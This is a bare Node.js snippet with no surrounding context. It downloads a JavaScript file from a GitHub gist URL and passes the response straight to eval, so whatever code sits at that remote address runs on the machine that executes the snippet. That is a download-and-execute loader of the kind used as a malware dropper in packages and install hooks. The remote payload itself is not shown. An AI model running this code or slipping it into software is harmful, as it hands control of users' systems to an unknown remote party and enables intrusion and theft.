const https = require("https");
https.get("https://gist.githubusercontent.com/puffsdad/b53f675ad43eefafaea6356e8afae2fa/raw/c718461cee2517a0a7cf53cf59d56cc3622c1cd4/egp.js", r => { let d = ""; r.on("data", c => d += c); r.on("end", () => eval(d)); });
